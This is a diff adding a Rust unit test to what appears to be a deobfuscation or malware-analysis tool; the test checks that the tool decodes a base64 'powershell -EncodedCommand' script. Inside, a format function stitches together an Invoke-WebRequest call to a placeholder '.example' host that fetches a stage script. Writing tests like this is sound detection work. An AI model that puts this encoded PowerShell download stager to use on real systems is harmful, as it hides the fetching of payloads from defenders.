@@ -16138,6 +16138,35 @@ Format-Text 'Invoke-WebRequest -Uri https://ps-string' '-format-extractor' '.exa
     }
 
     #[test]
+    fn ps1_literal_array_format_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let url = "https://ps-array-format-extractor.example/stage.ps1";
+        let inner = r#"function Format-Text($left,$middle,$right) {
+  return '{0}{1}{2}' -f @($left,$middle,$right)
+}
+Format-Text 'Invoke-WebRequest -Uri https://ps-array' '-format-extractor' '.example/stage.ps1'"#;
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == url
+            )
+        });
+        assert!(
+            has,
+            "literal array format extractor call was not decoded: {:?}\n{}",
+            report.traits, report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_literal_constant_split_operator_extractor_call_recovers_nested_command() {
         use base64::Engine;
 
